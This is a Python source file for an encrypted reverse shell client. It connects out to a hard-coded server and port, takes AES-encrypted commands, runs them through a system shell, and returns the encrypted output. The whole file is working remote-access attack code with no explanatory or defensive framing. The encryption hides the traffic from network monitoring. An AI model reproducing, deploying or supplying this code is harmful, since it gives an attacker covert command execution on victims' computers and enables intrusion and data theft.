#!/usr/bin/env python3
import os, sys
import socket
import subprocess
from Crypto.Cipher import AES

host_server = '127.0.0.1'
host_port = '1776'
aes_key = '8ZT%a*SJxTD*f6#8C6BfpHmf#DcE5^qH'
aes_iv = 'sPqapxT*4vZXjZ$w'
aes_bs = 64


def bit_pad(bs, message):
    return(message + (bs - len(message) % bs) * chr(bs - len(message) % bs))

def bit_unpad(ciphertext):
    return(ciphertext[:-ord(ciphertext[len(ciphertext)-1:])])

def do_encrypt(key, iv, bs, message):
    message = bit_pad(bs, message)
    obj = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = obj.encrypt(message)
    return(ciphertext)

def do_decrypt(key, iv, ciphertext):
    obj2 = AES.new(key, AES.MODE_CBC, iv)
    message = obj2.decrypt(ciphertext)
    message = bit_unpad(message)
    return(message)

def send_message(clientsocket, message):
    message = do_encrypt(aes_key, aes_iv, aes_bs, message)
    clientsocket.send(message)

def connect_to_server(server, port):
    global clientsocket
    clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    clientsocket.connect((server, int(port)))
    connection_status = 'conn established'
    send_message(clientsocket, connection_status)
    return(clientsocket)

def check_os():
    if sys.platform == "linux" or sys.platform == "linux2":
        current_os = 'linux'
    elif sys.platform == "darwin":
        current_os = 'macOS'
    elif sys.platform == "win32":
        current_os = 'windows'
    else:
        current_os = 'other'
    return(current_os)

def shell_prompt(operating_system):
    cwd = os.getcwd()
    if operating_system == 'linux':
        shell = cwd + " $"       
    elif operating_system == 'macOS':
        shell = cwd + " $"
    elif operating_system == 'windows':
        shell = cwd + " >"
    else:
        shell = cwd = " $"

def run_cmd(command, clientsocket):
    clrtxt_comm = subprocess.Popen(str(command), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, STDERR = clrtxt_comm.communicate()
    output = output.decode('utf-8')
    return(output)


def main(server, port, key, iv, bs):
    clientsocket = connect_to_server(server, port)
    try:
        while True:
            operating_system = check_os()
            data = clientsocket.recv(2048)
            if len(data) > 0:
                message = do_decrypt(key, iv, data)
                command = message.decode('utf-8')
                output = run_cmd(command, clientsocket)
                send_message(clientsocket, output)
    except KeyboardInterrupt:
        print('Interrupted')
            
        
if __name__ == '__main__':
    main(host_server, host_port, aes_key, aes_iv, aes_bs)
